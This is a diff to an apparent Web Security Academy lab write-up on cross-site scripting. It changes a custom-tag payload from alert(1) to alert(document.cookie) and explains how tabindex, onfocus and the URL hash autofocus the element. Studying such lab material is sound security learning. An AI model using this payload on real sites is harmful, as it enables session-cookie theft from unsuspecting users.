@@ -16,8 +16,13 @@ location.href = "https://0a90000304a1a25880b53aa700540081.web-security-academy.n
 ```
 My custom tag:
 ```html
-<random id="hack" tabindex="1" onfocus="alert(1)">#hack>
+<random id="hack" tabindex="1" onfocus="alert(document.cookie)">#hack>
 ```
 
 Here's my idea behind it:
-I created a custom tag that heritage some 
+I created a custom tag that inherited the HTMLElement property to be its attribute (id, tabindex, onfocus).
+
+Here's each one's role:
+- tabindex="1" : makes this tag be able to be focused.
+- onfocus="alert(document.cookie)": alert the victim's cookie when this tag be focused.
+- id="hack" and `#hack` : I took advantage the browser's default setting: autofocus the id after the hash in URL.
